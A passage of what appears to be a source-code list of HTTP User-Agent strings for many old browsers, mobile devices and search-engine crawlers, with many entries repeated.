               'Links (2.2; GNU/kFreeBSD 6.3-1-486 i686; 80x25)',
               'Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.0; WOW64; Trident/4.0; SLCC1)',
               'Mozilla/1.22 (compatible; Konqueror/4.3; Linux) KHTML/4.3.5 (like Gecko)',
               'Mozilla/4.0 (compatible; MSIE 6.0; Windows CE; IEMobile 6.5)',
               'Opera/9.80 (Macintosh; U; de-de) Presto/2.8.131 Version/11.10',
               'Mozilla/5.0 (X11; U; Linux i686; en-US; rv:1.9.1.9) Gecko/20100318 Mandriva/2.0.4-69.1mib2010.0 SeaMonkey/2.0.4',
               'Mozilla/4.0 (compatible; MSIE 6.1; Windows XP) Gecko/20060706 IEMobile/7.0',
               'Mozilla/5.0 (iPad; U; CPU OS 3_2 like Mac OS X; en-us) AppleWebKit/531.21.10 (KHTML, like Gecko) Version/4.0.4 Mobile/7B334b Safari/531.21.10',
               'Mozilla/5.0 (Macintosh; I; Intel Mac OS X 10_6_7; ru-ru)',
               'Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Trident/5.0)',
               'Mozilla/1.22 (compatible; MSIE 6.0; Windows NT 6.1; Trident/4.0; GTB6; SLCC2; .NET CLR 2.0.50727; .NET CLR 3.5.30729; .NET CLR 3.0.30729; Media Center PC 6.0; OfficeLiveConnector.1.4; OfficeLivePatch.1.3)',
               'Mozilla/5.0 (compatible; YandexBot/3.0; +http://yandex.com/bots)',
               'Mozilla/4.0 (Macintosh; U; Intel Mac OS X 10_6_7; en-US) AppleWebKit/534.16 (KHTML, like Gecko) Chrome/10.0.648.205 Safari/534.16',
               'Mozilla/1.22 (X11; U; Linux x86_64; en-US; rv:1.9.1.1) Gecko/20090718 Firefox/3.5.1',
               'Mozilla/5.0 (compatible; MSIE 2.0; Windows NT 6.1; WOW64; Trident/4.0; SLCC2; .NET CLR 2.0.50727; .NET CLR 3.0.30729; InfoPath.2)',
               'Opera/9.80 (Windows NT 5.2; U; ru) Presto/2.5.22 Version/10.51',
               'Mozilla/5.0 (compatible; MSIE 2.0; Windows CE; IEMobile 7.0)',
               'Mozilla/4.0 (Macintosh; U; PPC Mac OS X; en-US)',
               'Mozilla/5.0 (Windows; U; Windows NT 6.0; en; rv:1.9.1.7) Gecko/20091221 Firefox/3.5.7',
               'BlackBerry8300/4.2.2 Profile/MIDP-2.0 Configuration/CLDC-1.1 VendorID/107 UP.Link/6.2.3.15.0',
               'Mozilla/1.22 (compatible; MSIE 2.0; Windows 3.1)',
               'Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; Avant Browser [avantbrowser.com]; iOpus-I-M; QXW03416; .NET CLR 1.1.4322)',
               'Mozilla/3.0 (Windows NT 6.1; ru-ru; rv:1.9.1.3.) Win32; x86 Firefox/3.5.3 (.NET CLR 2.0.50727)',
               'Opera/7.0 (compatible; MSIE 2.0; Windows 3.1)',
               'Opera/9.80 (Windows NT 5.1; U; en-US) Presto/2.8.131 Version/11.10',
               'Mozilla/4.0 (compatible; MSIE 6.0; America Online Browser 1.1; rev1.5; Windows NT 5.1;)',
               'Mozilla/5.0 (Windows; U; Windows CE 4.21; rv:1.8b4) Gecko/20050720 Minimo/0.007',
               'BlackBerry9000/5.0.0.93 Profile/MIDP-2.0 Configuration/CLDC-1.1 VendorID/179',
               'Mozilla/5.0 (compatible; 008/0.83; http://www.80legs.com/webcrawler.html) Gecko/2008032620',
               'Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 6.0) AddSugarSpiderBot www.idealobserver.com',
               'Mozilla/5.0 (compatible; AnyApexBot/1.0; +http://www.anyapex.com/bot.html)',
               'Mozilla/4.0 (compatible; Arachmo)', 'Mozilla/4.0 (compatible; B-l-i-t-z-B-O-T)',
               'Mozilla/5.0 (compatible; Baiduspider/2.0; +http://www.baidu.com/search/spider.html)',
               'Mozilla/5.0 (compatible; Baiduspider/2.0; +http://www.baidu.com/search/spider.html)',
               'Mozilla/5.0 (compatible; BecomeBot/2.3; MSIE 6.0 compatible; +http://www.become.com/site_owners.html)',
               'BillyBobBot/1.0 (+http://www.billybobbot.com/crawler/)',
               'Mozilla/5.0 (compatible; bingbot/2.0; +http://www.bing.com/bingbot.htm)',
               'Sqworm/2.9.85-BETA (beta_release; 20011115-775; i686-pc-linux-gnu)',
               'Mozilla/5.0 (compatible; YandexImages/3.0; +http://yandex.com/bots)',
               'Mozilla/5.0 (compatible; Yahoo! Slurp; http://help.yahoo.com/help/us/ysearch/slurp)',
               'Mozilla/5.0 (compatible; YodaoBot/1.0; http://www.yodao.com/help/webmaster/spider/; )',
               'Mozilla/5.0 (compatible; YodaoBot/1.0; http://www.yodao.com/help/webmaster/spider/; )',
               'Mozilla/4.0 compatible ZyBorg/1.0 Dead Link Checker (wn.zyborg@looksmart.net; http://www.WISEnutbot.com)',
               'Mozilla/4.0 compatible ZyBorg/1.0 Dead Link Checker (wn.dlc@looksmart.net; http://www.WISEnutbot.com)',
               'Mozilla/4.0 compatible ZyBorg/1.0 (wn-16.zyborg@looksmart.net; http://www.WISEnutbot.com)',
               'Mozilla/5.0 (compatible; U; ABrowse 0.6; Syllable) AppleWebKit/420+ (KHTML, like Gecko)',
               'Mozilla/5.0 (compatible; MSIE 8.0; Windows NT 6.0; Trident/4.0; Acoo Browser 1.98.744; .NET CLR 3.5.30729)',
               'Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 5.1; Trident/4.0; SV1; Acoo Browser; .NET CLR 2.0.50727; .NET CLR 3.0.4506.2152; .NET CLR 3.5.30729; Avant Browser)',
               'Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.0; Trident/4.0; Acoo Browser; GTB6; Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; SV1) ; InfoPath.1; .NET CLR 3.5.30729; .NET CLR 3.0.30618)',
               'Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; SV1; Acoo Browser; .NET CLR 1.1.4322; .NET CLR 2.0.50727)',
               'Mozilla/5.0 (Macintosh; U; PPC Mac OS X; en) AppleWebKit/419 (KHTML, like Gecko, Safari/419.3) Cheshire/1.0.ALPHA',
               'Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US) AppleWebKit/532.2 (KHTML, like Gecko) ChromePlus/4.0.222.3 Chrome/4.0.222.3 Safari/532.2',
               'Mozilla/5.0 (Windows; U; Windows NT 6.1; en-US) AppleWebKit/534.10 (KHTML, like Gecko) Chrome/8.0.552.215 Safari/534.10 ChromePlus/1.5.1.1',
               'Links (2.7; Linux 3.7.9-2-ARCH x86_64; GNU C 4.7.1; text)',
               'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_9_3) AppleWebKit/537.75.14 (KHTML, like Gecko) Version/7.0.3 Safari/7046A194A',
               'Mozilla/5.0 (PLAYSTATION 3; 3.55)', 'Mozilla/5.0 (PLAYSTATION 3; 2.00)',
               'Mozilla/5.0 (PLAYSTATION 3; 1.00)',
               'Mozilla/5.0 (Windows NT 6.3; WOW64; rv:24.0) Gecko/20100101 Thunderbird/24.4.0',
               'Mozilla/5.0 (compatible; AbiLogicBot/1.0; +http://www.abilogic.com/bot.html)',
               'SiteBar/3.3.8 (Bookmark Server; http://sitebar.org/)',
               'iTunes/9.0.3 (Macintosh; U; Intel Mac OS X 10_6_2; en-ca)',
               'iTunes/9.0.3 (Macintosh; U; Intel Mac OS X 10_6_2; en-ca)',
               'Mozilla/4.0 (compatible; WebCapture 3.0; Macintosh)',
               'Mozilla/5.0 (Windows; U; Windows NT 5.1; de; rv:1.9.2.3) Gecko/20100401 Firefox/3.6.3 (FM Scene 4.6.1)',
               'Mozilla/5.0 (Windows; U; Windows NT 5.1; de; rv:1.9.2.3) Gecko/20100401 Firefox/3.6.3 (.NET CLR 3.5.30729) (Prevx 3.0.5) ',
               'Mozilla/5.0 (X11; U; Linux x86_64; en-US; rv:1.8.1.8) Gecko/20071004 Iceweasel/2.0.0.8 (Debian-2.0.0.6+2.0.0.8-Oetch1)',
               'Mozilla/5.0 (Windows; U; Windows NT 5.2; en-US; rv:1.8.0.1) Gecko/20060111 Firefox/1.5.0.1',
               'Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; SV1)',
               'Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; .NET CLR 1.1.4322)',
               'Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; {1C69E7AA-C14E-200E-5A77-8EAB2D667A07})',
               'Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; acc=baadshah; acc=none; freenet DSL 1.1; (none))',
               'Mozilla/4.0 (compatible; MSIE 5.5; Windows 98)',
               'Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; en) Opera 8.51',
               'Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US; rv:1.8.0.1) Gecko/20060111 Firefox/1.5.0.1',
               'Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; snprtz|S26320700000083|2600#Service Pack 1#2#5#154321|isdn)',
               'Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; SV1; Alexa Toolbar; mxie; .NET CLR 1.1.4322)',
               'Mozilla/5.0 (Macintosh; U; PPC Mac OS X; ja-jp) AppleWebKit/417.9 (KHTML, like Gecko) Safari/417.8',
               'Mozilla/5.0 (X11; U; Linux i686; en-US; rv:1.7.12) Gecko/20051010 Firefox/1.0.7 (Ubuntu package 1.0.7)',
               'Mozilla/5.0 (X11; U; Linux x86_64; en-US; rv:1.9.1.3) Gecko/20090913 Firefox/3.5.3',
               'Mozilla/5.0 (Windows; U; Windows NT 6.1; en; rv:1.9.1.3) Gecko/20090824 Firefox/3.5.3 (.NET CLR 3.5.30729)',
               'Mozilla/5.0 (Windows; U; Windows NT 5.2; en-US; rv:1.9.1.3) Gecko/20090824 Firefox/3.5.3 (.NET CLR 3.5.30729)',
               'Mozilla/5.0 (Windows; U; Windows NT 6.1; en-US; rv:1.9.1.1) Gecko/20090718 Firefox/3.5.1',
               'Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US) AppleWebKit/532.1 (KHTML, like Gecko) Chrome/4.0.219.6 Safari/532.1',
               'Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.1; WOW64; Trident/4.0; SLCC2; .NET CLR 2.0.50727; InfoPath.2)',
               'Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.0; Trident/4.0; SLCC1; .NET CLR 2.0.50727; .NET CLR 1.1.4322; .NET CLR 3.5.30729; .NET CLR 3.0.30729)',
               'Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 5.2; Win64; x64; Trident/4.0)',
               'Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 5.1; Trident/4.0; SV1; .NET CLR 2.0.50727; InfoPath.2)',
               'Mozilla/5.0 (Windows; U; MSIE 7.0; Windows NT 6.0; en-US)',
               'Mozilla/4.0 (compatible; MSIE 6.1; Windows XP)',
               'Opera/9.80 (Windows NT 5.2; U; ru) Presto/2.5.22 Version/10.51',
               'Mozilla/5.0 (X11; U; Linux x86_64; en-US; rv:1.9.1.3) Gecko/20090913 Firefox/3.5.3',
               'Mozilla/5.0 (Windows; U; Windows NT 6.1; ru; rv:1.9.1.3) Gecko/20090824 Firefox/3.5.3 (.NET CLR 2.0.50727)',
               'Mozilla/5.0 (Windows; U; Windows NT 5.2; de-de; rv:1.9.1.3) Gecko/20090824 Firefox/3.5.3 (.NET CLR 3.5.30729)',
               'Mozilla/5.0 (Windows; U; Windows NT 6.1; en-US; rv:1.9.1.1) Gecko/20090718 Firefox/3.5.1 (.NET CLR 3.0.04506.648)',
               'Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; SV1; .NET CLR 2.0.50727; .NET4.0C; .NET4.0E',
               'Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US) AppleWebKit/532.1 (KHTML, like Gecko) Chrome/4.0.219.6 Safari/532.1',
               'Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.1; WOW64; Trident/4.0; SLCC2; .NET CLR 2.0.50727; InfoPath.2)',
               'Opera/9.60 (J2ME/MIDP; Opera Mini/4.2.14912/812; U; ru) Presto/2.4.15',
               'Mozilla/5.0 (Macintosh; U; PPC Mac OS X; en-US) AppleWebKit/125.4 (KHTML, like Gecko, Safari) OmniWeb/v563.57',
               'Mozilla/5.0 (SymbianOS/9.2; U; Series60/3.1 NokiaN95_8GB/31.0.015; Profile/MIDP-2.0 Configuration/CLDC-1.1 ) AppleWebKit/413 (KHTML, like Gecko) Safari/413',
               'Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.0; Trident/4.0; SLCC1; .NET CLR 2.0.50727; .NET CLR 1.1.4322; .NET CLR 3.5.30729; .NET CLR 3.0.30729)',
               'Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 5.2; Win64; x64; Trident/4.0)',
               'Mozilla/5.0 (Windows; U; WinNT4.0; en-US; rv:1.8.0.5) Gecko/20060706 K-Meleon/1.0',
               'Lynx/2.8.6rel.4 libwww-FM/2.14 SSL-MM/1.4.1 OpenSSL/0.9.8g',
               'Mozilla/4.76 [en] (PalmOS; U; WebPro/3.0.1a; Palm-Arz1)',
               'Mozilla/5.0 (Macintosh; U; PPC Mac OS X; de-de) AppleWebKit/418 (KHTML, like Gecko) Shiira/1.2.2 Safari/125',
               'Mozilla/5.0 (X11; U; Linux i686 (x86_64); en-US; rv:1.8.1.6) Gecko/2007072300 Iceweasel/2.0.0.6 (Debian-2.0.0.6-0etch1+lenny1)',
               'Mozilla/5.0 (SymbianOS/9.1; U; en-us) AppleWebKit/413 (KHTML, like Gecko) Safari/413',
               'Mozilla/4.0 (compatible; MSIE 6.1; Windows NT 5.1; Trident/4.0; SV1; .NET CLR 3.5.30729; InfoPath.2)',
               'Mozilla/5.0 (Windows; U; MSIE 7.0; Windows NT 6.0; en-US)',
               'Links (2.2; GNU/kFreeBSD 6.3-1-486 i686; 80x25)',
               'Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.0; WOW64; Trident/4.0; SLCC1)',
               'Mozilla/1.22 (compatible; Konqueror/4.3; Linux) KHTML/4.3.5 (like Gecko)',
               'Mozilla/4.0 (compatible; MSIE 6.0; Windows CE; IEMobile 6.5)',
               'Opera/9.80 (Macintosh; U; de-de) Presto/2.8.131 Version/11.10',
               'Mozilla/5.0 (X11; U; Linux i686; en-US; rv:1.9.1.9) Gecko/20100318 Mandriva/2.0.4-69.1mib2010.0 SeaMonkey/2.0.4',
               'Mozilla/4.0 (compatible; MSIE 6.1; Windows XP) Gecko/20060706 IEMobile/7.0',
               'Mozilla/5.0 (iPad; U; CPU OS 3_2 like Mac OS X; en-us) AppleWebKit/531.21.10 (KHTML, like Gecko) Version/4.0.4 Mobile/7B334b Safari/531.21.10',
               'Mozilla/5.0 (Macintosh; I; Intel Mac OS X 10_6_7; ru-ru)',
               'Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Trident/5.0)',
               'Mozilla/1.22 (compatible; MSIE 6.0; Windows NT 6.1; Trident/4.0; GTB6; SLCC2; .NET CLR 2.0.50727; .NET CLR 3.5.30729; .NET CLR 3.0.30729; Media Center PC 6.0; OfficeLiveConnector.1.4; OfficeLivePatch.1.3)',
               'Mozilla/5.0 (compatible; YandexBot/3.0; +http://yandex.com/bots)',
               'Mozilla/4.0 (Macintosh; U; Intel Mac OS X 10_6_7; en-US) AppleWebKit/534.16 (KHTML, like Gecko) Chrome/10.0.648.205 Safari/534.16',
               'Mozilla/1.22 (X11; U; Linux x86_64; en-US; rv:1.9.1.1) Gecko/20090718 Firefox/3.5.1',
               'Mozilla/5.0 (compatible; MSIE 2.0; Windows NT 6.1; WOW64; Trident/4.0; SLCC2; .NET CLR 2.0.50727; .NET CLR 3.0.30729; InfoPath.2)',
               'Opera/9.80 (Windows NT 5.2; U; ru) Presto/2.5.22 Version/10.51',
               'Mozilla/5.0 (compatible; MSIE 2.0; Windows CE; IEMobile 7.0)',
               'Mozilla/4.0 (Macintosh; U; PPC Mac OS X; en-US)',
               'Mozilla/5.0 (Windows; U; Windows NT 6.0; en; rv:1.9.1.7) Gecko/20091221 Firefox/3.5.7',
               'BlackBerry8300/4.2.2 Profile/MIDP-2.0 Configuration/CLDC-1.1 VendorID/107 UP.Link/6.2.3.15.0',
               'Mozilla/1.22 (compatible; MSIE 2.0; Windows 3.1)',
               'Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; Avant Browser [avantbrowser.com]; iOpus-I-M; QXW03416; .NET CLR 1.1.4322)',
               'Mozilla/3.0 (Windows NT 6.1; ru-ru; rv:1.9.1.3.) Win32; x86 Firefox/3.5.3 (.NET CLR 2.0.50727)',
               'Opera/7.0 (compatible; MSIE 2.0; Windows 3.1)',
               'Opera/9.80 (Windows NT 5.1; U; en-US) Presto/2.8.131 Version/11.10',
               'Mozilla/4.0 (compatible; MSIE 6.0; America Online Browser 1.1; rev1.5; Windows NT 5.1;)',
               'Mozilla/5.0 (Windows; U; Windows CE 4.21; rv:1.8b4) Gecko/20050720 Minimo/0.007',
               'BlackBerry9000/5.0.0.93 Profile/MIDP-2.0 Configuration/CLDC-1.1 VendorID/179',
               'Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 5.1; .NET CLR 1.1.4322; .NET CLR 2.0.50727; .NET CLR 3.0.04506.30)',
               'Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; .NET CLR 1.1.4322)',
               'Googlebot/2.1 (http://www.googlebot.com/bot.html)', 'Opera/9.20 (Windows NT 6.0; U; en)',
               'Mozilla/5.0 (X11; U; Linux i686; en-US; rv:1.8.1.1) Gecko/20061205 Iceweasel/2.0.0.1 (Debian-2.0.0.1+dfsg-2)',
               'Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 5.1; Trident/4.0; FDM; .NET CLR 2.0.50727; InfoPath.2; .NET CLR 1.1.4322)',
               'Opera/10.00 (X11; Linux i686; U; en) Presto/2.2.0',
               'Mozilla/5.0 (Windows; U; Windows NT 6.0; he-IL) AppleWebKit/528.16 (KHTML, like Gecko) Version/4.0 Safari/528.16',
               'Mozilla/5.0 (compatible; Yahoo! Slurp/3.0; http://help.yahoo.com/help/us/ysearch/slurp)',
               'Mozilla/5.0 (X11; U; Linux x86_64; en-US; rv:1.9.2.13) Gecko/20101209 Firefox/3.6.13',
               'Mozilla/4.0 (compatible; MSIE 9.0; Windows NT 5.1; Trident/5.0)',
               'Mozilla/5.0 (compatible; MSIE 8.0; Windows NT 5.1; Trident/4.0; .NET CLR 1.1.4322; .NET CLR 2.0.50727)',
               'Mozilla/4.0 (compatible; MSIE 7.0b; Windows NT 6.0)', 'Mozilla/4.0 (compatible; MSIE 6.0b; Windows 98)',
               'Mozilla/5.0 (Windows; U; Windows NT 6.1; ru; rv:1.9.2.3) Gecko/20100401 Firefox/4.0 (.NET CLR 3.5.30729)',
               'Mozilla/5.0 (X11; U; Linux x86_64; en-US; rv:1.9.2.8) Gecko/20100804 Gentoo Firefox/3.6.8',
               'Mozilla/5.0 (X11; U; Linux x86_64; en-US; rv:1.9.2.7) Gecko/20100809 Fedora/3.6.7-1.fc14 Firefox/3.6.7',
               'Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)',
               'Mozilla/5.0 (compatible; Yahoo! Slurp; http://help.yahoo.com/help/us/ysearch/slurp)',
               'YahooSeeker/1.2 (compatible; Mozilla 4.0; MSIE 5.5; yahooseeker at yahoo-inc dot com ; http://help.yahoo.com/help/us/shop/merchant/)',
               'Mozilla/5.0 (X11; U; Linux x86_64; en-US; rv:1.9.1.3) Gecko/20090913 Firefox/3.5.3',
               'Mozilla/5.0 (Windows; U; Windows NT 6.1; en; rv:1.9.1.3) Gecko/20090824 Firefox/3.5.3 (.NET CLR 3.5.30729)',
               'Mozilla/5.0 (Windows; U; Windows NT 5.2; en-US; rv:1.9.1.3) Gecko/20090824 Firefox/3.5.3 (.NET CLR 3.5.30729)',
               'Mozilla/5.0 (Windows; U; Windows NT 6.1; en-US; rv:1.9.1.1) Gecko/20090718 Firefox/3.5.1',
               'Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US) AppleWebKit/532.1 (KHTML, like Gecko) Chrome/4.0.219.6 Safari/532.1',
               'Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.1; WOW64; Trident/4.0; SLCC2; .NET CLR 2.0.50727; InfoPath.2)',
               'Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.0; Trident/4.0; SLCC1; .NET CLR 2.0.50727; .NET CLR 1.1.4322; .NET CLR 3.5.30729; .NET CLR 3.0.30729)',
               'Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 5.2; Win64; x64; Trident/4.0)',
               'Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 5.1; Trident/4.0; SV1; .NET CLR 2.0.50727; InfoPath.2)',
               'Mozilla/5.0 (Windows; U; MSIE 7.0; Windows NT 6.0; en-US)',
               'Mozilla/4.0 (compatible; MSIE 6.1; Windows XP)',
               'Opera/9.80 (Windows NT 5.2; U; ru) Presto/2.5.22 Version/10.51',
               'AppEngine-Google; (+http://code.google.com/appengine; appid: webetrex)',
               'Mozilla/5.0 (compatible; MSIE 9.0; AOL 9.7; AOLBuild 4343.19; Windows NT 6.1; WOW64; Trident/5.0; FunWebProducts)',
               'Mozilla/4.0 (compatible; MSIE 8.0; AOL 9.7; AOLBuild 4343.27; Windows NT 5.1; Trident/4.0; .NET CLR 2.0.50727; .NET CLR 3.0.4506.2152; .NET CLR 3.5.30729)',
               'Mozilla/4.0 (compatible; MSIE 8.0; AOL 9.7; AOLBuild 4343.21; Windows NT 5.1; Trident/4.0; .NET CLR 1.1.4322; .NET CLR 2.0.50727; .NET CLR 3.0.04506.30; .NET CLR 3.0.04506.648; .NET CLR 3.0.4506.2152; .NET CLR 3.5.30729; .NET4.0C; .NET4.0E)',
               'Mozilla/4.0 (compatible; MSIE 8.0; AOL 9.7; AOLBuild 4343.19; Windows NT 5.1; Trident/4.0; GTB7.2; .NET CLR 1.1.4322; .NET CLR 2.0.50727; .NET CLR 3.0.4506.2152; .NET CLR 3.5.30729)',
               'Mozilla/4.0 (compatible; MSIE 8.0; AOL 9.7; AOLBuild 4343.19; Windows NT 5.1; Trident/4.0; .NET CLR 2.0.50727; .NET CLR 3.0.04506.30; .NET CLR 3.0.04506.648; .NET CLR 3.0.4506.2152; .NET CLR 3.5.30729; .NET4.0C; .NET4.0E)',
               'Mozilla/4.0 (compatible; MSIE 7.0; AOL 9.7; AOLBuild 4343.19; Windows NT 5.1; Trident/4.0; .NET CLR 2.0.50727; .NET CLR 3.0.04506.30; .NET CLR 3.0.04506.648; .NET CLR 3.0.4506.2152; .NET CLR 3.5.30729; .NET4.0C; .NET4.0E)',
               'Mozilla/5.0 (X11; U; Linux x86_64; en-US; rv:1.9.1.3) Gecko/20090913 Firefox/3.5.3',
               'Mozilla/5.0 (Windows; U; Windows NT 6.1; ru; rv:1.9.1.3) Gecko/20090824 Firefox/3.5.3 (.NET CLR 2.0.50727)',
               'Mozilla/5.0 (Windows; U; Windows NT 5.2; de-de; rv:1.9.1.3) Gecko/20090824 Firefox/3.5.3 (.NET CLR 3.5.30729)',
               'Mozilla/5.0 (Windows; U; Windows NT 6.1; en-US; rv:1.9.1.1) Gecko/20090718 Firefox/3.5.1 (.NET CLR 3.0.04506.648)',
               'Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; SV1; .NET CLR 2.0.50727; .NET4.0C; .NET4.0E',
               'Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US) AppleWebKit/532.1 (KHTML, like Gecko) Chrome/4.0.219.6 Safari/532.1',
               'Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.1; WOW64; Trident/4.0; SLCC2; .NET CLR 2.0.50727; InfoPath.2)',
               'Opera/9.60 (J2ME/MIDP; Opera Mini/4.2.14912/812; U; ru) Presto/2.4.15',
               'Mozilla/5.0 (Macintosh; U; PPC Mac OS X; en-US) AppleWebKit/125.4 (KHTML, like Gecko, Safari) OmniWeb/v563.57',
               'Mozilla/5.0 (SymbianOS/9.2; U; Series60/3.1 NokiaN95_8GB/31.0.015; Profile/MIDP-2.0 Configuration/CLDC-1.1 ) AppleWebKit/413 (KHTML, like Gecko) Safari/413',
               'Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.0; Trident/4.0; SLCC1; .NET CLR 2.0.50727; .NET CLR 1.1.4322; .NET CLR 3.5.30729; .NET CLR 3.0.30729)',
               'Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 5.2; Win64; x64; Trident/4.0)',
               'Mozilla/5.0 (Windows; U; WinNT4.0; en-US; rv:1.8.0.5) Gecko/20060706 K-Meleon/1.0',
               'Lynx/2.8.6rel.4 libwww-FM/2.14 SSL-MM/1.4.1 OpenSSL/0.9.8g',
               'Mozilla/4.76 [en] (PalmOS; U; WebPro/3.0.1a; Palm-Arz1)',
               'Mozilla/5.0 (Macintosh; U; PPC Mac OS X; de-de) AppleWebKit/418 (KHTML, like Gecko) Shiira/1.2.2 Safari/125',
               'Mozilla/5.0 (X11; U; Linux i686 (x86_64); en-US; rv:1.8.1.6) Gecko/2007072300 Iceweasel/2.0.0.6 (Debian-2.0.0.6-0etch1+lenny1)',
               'Mozilla/5.0 (SymbianOS/9.1; U; en-us) AppleWebKit/413 (KHTML, like Gecko) Safari/413',
               'Mozilla/4.0 (compatible; MSIE 6.1; Windows NT 5.1; Trident/4.0; SV1; .NET CLR 3.5.30729; InfoPath.2)',
               'Mozilla/5.0 (X11; U; Linux x86_64; en-US; rv:1.9.1.3) Gecko/20090913 Firefox/3.5.3',
               'Mozilla/5.0 (Windows; U; Windows NT 6.1; en; rv:1.9.1.3) Gecko/20090824 Firefox/3.5.3 (.NET CLR 3.5.30729)',
               'Mozilla/5.0 (Windows; U; Windows NT 5.2; en-US; rv:1.9.1.3) Gecko/20090824 Firefox/3.5.3 (.NET CLR 3.5.30729)',
               'Mozilla/5.0 (Windows; U; Windows NT 6.1; en-US; rv:1.9.1.1) Gecko/20090718 Firefox/3.5.1',
               'Mozilla/5.0 (X11; U; Linux x86_64; en-US; rv:1.9.1.3) Gecko/20090913 Firefox/3.5.3',
               'Mozilla/5.0 (Windows; U; Windows NT 6.1; en; rv:1.9.1.3) Gecko/20090824 Firefox/3.5.3 (.NET CLR 3.5.30729)',
               'Mozilla/5.0 (Windows; U; Windows NT 5.2; en-US; rv:1.9.1.3) Gecko/20090824 Firefox/3.5.3 (.NET CLR 3.5.30729)',
               'Mozilla/5.0 (Windows; U; Windows NT 6.1; en-US; rv:1.9.1.1) Gecko/20090718 Firefox/3.5.1',
               'Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US) AppleWebKit/532.1 (KHTML, like Gecko) Chrome/4.0.219.6 Safari/532.1',
               'Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.1; WOW64; Trident/4.0; SLCC2; .NET CLR 2.0.50727; InfoPath.2)',
               'Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.0; Trident/4.0; SLCC1; .NET CLR 2.0.50727; .NET CLR 1.1.4322; .NET CLR 3.5.30729; .NET CLR 3.0.30729)',
               'Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 5.2; Win64; x64; Trident/4.0)',
               'Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 5.1; Trident/4.0; SV1; .NET CLR 2.0.50727; InfoPath.2)',
               'Mozilla/5.0 (Windows; U; MSIE 7.0; Windows NT 6.0; en-US)',
               'Mozilla/4.0 (compatible; MSIE 6.1; Windows XP)',
               'Opera/9.80 (Windows NT 5.2; U; ru) Presto/2.5.22 Version/10.51',
               'Mozilla/5.0 (X11; U; Linux x86_64; en-US; rv:1.9.1.3) Gecko/20090913 Firefox/3.5.3',
               'Mozilla/5.0 (Windows; U; Windows NT 6.1; ru; rv:1.9.1.3) Gecko/20090824 Firefox/3.5.3 (.NET CLR 2.0.50727)',
               'Mozilla/5.0 (Windows; U; Windows NT 5.2; de-de; rv:1.9.1.3) Gecko/20090824 Firefox/3.5.3 (.NET CLR 3.5.30729)',
               'Mozilla/5.0 (Windows; U; Windows NT 6.1; en-US; rv:1.9.1.1) Gecko/20090718 Firefox/3.5.1 (.NET CLR 3.0.04506.648)',
               'Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; SV1; .NET CLR 2.0.50727; .NET4.0C; .NET4.0E',
               'Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US) AppleWebKit/532.1 (KHTML, like Gecko) Chrome/4.0.219.6 Safari/532.1',
               'Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.1; WOW64; Trident/4.0; SLCC2; .NET CLR 2.0.50727; InfoPath.2)',
               'Opera/9.60 (J2ME/MIDP; Opera Mini/4.2.14912/812; U; ru) Presto/2.4.15',
               'Mozilla/5.0 (Macintosh; U; PPC Mac OS X; en-US) AppleWebKit/125.4 (KHTML, like Gecko, Safari) OmniWeb/v563.57',
               'Mozilla/5.0 (SymbianOS/9.2; U; Series60/3.1 NokiaN95_8GB/31.0.015; Profile/MIDP-2.0 Configuration/CLDC-1.1 ) AppleWebKit/413 (KHTML, like Gecko) Safari/413',
               'Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.0; Trident/4.0; SLCC1; .NET CLR 2.0.50727; .NET CLR 1.1.4322; .NET CLR 3.5.30729; .NET CLR 3.0.30729)',
               'Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 5.2; Win64; x64; Trident/4.0)',
